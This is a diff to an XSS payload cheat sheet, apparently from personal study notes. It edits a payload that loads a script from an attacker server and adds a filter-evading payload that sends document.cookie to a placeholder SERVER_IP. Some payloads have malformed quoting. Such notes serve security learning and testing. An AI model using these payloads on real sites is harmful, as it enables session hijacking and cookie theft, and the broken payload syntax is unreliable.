@@ -100,7 +100,7 @@ iFrame (Useful when <script> tags are banned by the XSS filter)
 
 Make the victim's browser request a page on your server
 ```JavaScript
-<script src='http://<SERVER_IP>/test'></script>
+<script src='http://SERVER_IP/test'></script>
 ```
 
 Insert JavaScript code into HTML code as an attribute to the current tag
@@ -111,9 +111,14 @@ Insert JavaScript code into HTML code as an attribute to the current tag
 <a href="javascript:alert('XSS')>Click me</a>"
 ```
 
-Use the JavaScript `fromCharCode()` function to inject a string
+Use the JavaScript `fromCharCode()` function to construct an XSS payload without quotes
 ```JavaScript
 String,fromCharCode()
+```
+
+tmp
+```JavaScript
+<script<script>t>location='http://SERVER_IP/c='document.cookie;</scrip</script>t>
 ```
 
 ![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)
